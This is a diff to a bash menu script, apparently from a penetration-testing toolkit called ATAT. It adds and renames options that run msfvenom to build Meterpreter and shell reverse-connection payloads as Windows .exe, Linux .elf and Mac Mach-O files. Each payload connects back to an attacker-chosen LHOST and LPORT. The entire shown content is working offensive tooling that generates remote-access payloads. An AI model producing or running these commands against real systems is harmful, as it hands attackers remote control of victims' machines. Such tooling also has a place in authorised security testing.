@@ -220,37 +220,47 @@ case "$options" in
   # Accept upper or lowercase input.
   echo -e "\E[1;34m::::: \e[97mChoose Your Weapon \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 11=Main Menu | 12=QUIT: '
-options=("Windows 64" "Windows 32" "Linux 64" "Linux 32" "Mac 64" "Mac 32" "Android" "List_All" "Custom" "All The Payloads" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 13=Main Menu | 14=QUIT: '
+options=("Windows 64 TCP" "Windows 32 TCP" "Windows 64 HTTPS" "Windows 32 HTTPS" "Linux 64 TCP" "Linux 32 TCP" "Mac 64 TCP" "Mac 32 TCP" "Android" "List_All" "Custom" "All The Payloads" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
-        "Windows 64")
+        "Windows 64 TCP")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/ATAT/shell64.exe
-            echo -e "\E[1;34m::::: \e[97mshell64.exe saved to ~/ATAT/\E[1;34m:::::"
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/ATAT/shell64tcp.exe
+            echo -e "\E[1;34m::::: \e[97mshell64tcp.exe saved to ~/ATAT/\E[1;34m:::::"
             ;;
-        "Windows 32")
+        "Windows 32 TCP")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/ATAT/shell.exe
-            echo -e "\E[1;34m::::: \e[97mshell.exe saved to ~/ATAT/\E[1;34m:::::"
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/ATAT/shelltcp.exe
+            echo -e "\E[1;34m::::: \e[97mshelltcp.exe saved to ~/ATAT/\E[1;34m:::::"
             ;;
-        "Linux 64")
+        "Windows 64 HTTPS")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$uservar LPORT=$userport -f exe > ~/ATAT/shell64https.exe
+            echo -e "\E[1;34m::::: \e[97mshell64https.exe saved to ~/ATAT/\E[1;34m:::::"
+            ;;
+        "Windows 32 HTTPS")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p windows/meterpreter/reverse_https LHOST=$uservar LPORT=$userport -f exe > ~/ATAT/shellhttps.exe
+            echo -e "\E[1;34m::::: \e[97mshellhttps.exe saved to ~/ATAT/\E[1;34m:::::"
+            ;;
+        "Linux 64 TCP")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/ATAT/shell64.elf
             echo -e "\E[1;34m::::: \e[97mshell64.elf saved to ~/ATAT/\E[1;34m:::::"
             ;;
-        "Linux 32")
+        "Linux 32 TCP")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/ATAT/shell.elf
             echo -e "\E[1;34m::::: \e[97mshell.elf saved to ~/ATAT/\E[1;34m:::::"
             ;;
-        "Mac 64")
+        "Mac 64 TCP")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p osx/x64/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/ATAT/shell64.macho
             echo -e "\E[1;34m::::: \e[97mshell64.macho saved to ~/ATAT/\E[1;34m:::::"
             ;;
-        "Mac 32")
+        "Mac 32 TCP")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/ATAT/shell.macho
             echo -e "\E[1;34m::::: \e[97mshell.macho saved to ~/ATAT/\E[1;34m:::::"
